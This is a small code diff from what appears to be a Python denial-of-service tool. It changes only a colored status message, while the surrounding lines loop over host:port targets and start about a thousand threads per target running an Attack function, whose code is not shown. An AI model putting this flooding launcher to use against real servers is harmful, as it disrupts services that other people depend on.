@@ -37,7 +37,7 @@ while 1 == 1:
         count_threads = int(1000//count_targets)
         for row in rrows:
             trgt = row.split(":")
-            print (colored("Starting atack to %s with %s threads on %s port" % (trgt[0], count_threads, trgt[1]), 'green'))
+            print(colored("Starting atack ", 'green') + "to" + colored(trgt[0], 'red') + " with " + inttostr(count_threads) +" threads on "+ inttostr(trgt[1]) +" port")
             for i in range(count_threads):
                 #print ("Starting %s thread", i)
                 threading.Thread(target=Attack, args=(trgt[0], int(trgt[1]), 1024, timeout,)).start()
